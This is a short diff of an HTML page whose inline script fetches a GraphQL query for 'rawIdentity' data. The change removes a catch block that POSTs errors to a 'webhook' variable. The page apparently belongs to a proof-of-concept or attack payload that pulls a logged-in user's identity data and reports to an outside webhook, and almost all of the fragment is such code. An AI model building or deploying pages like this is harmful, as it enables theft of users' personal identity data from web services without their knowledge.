@@ -26,14 +26,6 @@
           body: JSON.stringify({"operationName":"GetIdentityDataForWebPush","variables":{},"query":"query GetIdentityDataForWebPush {\n  rawIdentity {\n    data\n    __typename\n  }\n}\n"})
         });
       })
-      .catch(err => {
-        // Optional: report fetch failure
-        fetch(webhook, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ error: err.toString() })
-        });
-      });
     </script>
   </body>
 </html>
